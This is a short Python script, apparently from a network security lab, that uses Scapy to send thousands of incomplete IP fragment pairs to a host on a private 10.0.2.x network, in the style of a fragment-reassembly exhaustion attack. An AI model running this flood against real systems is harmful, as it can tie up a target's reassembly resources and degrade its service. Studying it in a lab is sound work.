#!/usr/bin/python3
from scapy.all import *
# Construct IP header
from scapy.layers.inet import IP
#src="l49.127.74.171",
ip = IP(src="10.0.2.15",dst="10.0.2.9")


for i in range(5000,10000,1):
    try:
        ip.id = i # Identification
        ip.frag = 0 # Offset of this IP fragment
        ip.flags = 1 # Flags
        # Construct UDP header
        udp = UDP(sport=i, dport=9090,chksum=0)
        udp.len = 200 # This should be the combined length of all fragments
        # Construct payload
        payload = "A" * 72 # Put 80 bytes in the first fragment   (72 byte from payload + 8byte udp header)

        # Construct the entire packet and send it out
        pkt = ip/udp/payload # For other fragments, we should use ip/payload
        send(pkt, verbose=0)
        pkt.show()
        #----------------------second fragment---------------------


        print("----------------------------------second fragment---------------------------------")
        ip.proto=17
        payload2="B"*80 # 80 / 8
        ip.frag=10
        pkt2=ip/payload2
        send(pkt2, verbose=0)
        pkt2.show()
    except:
        continue


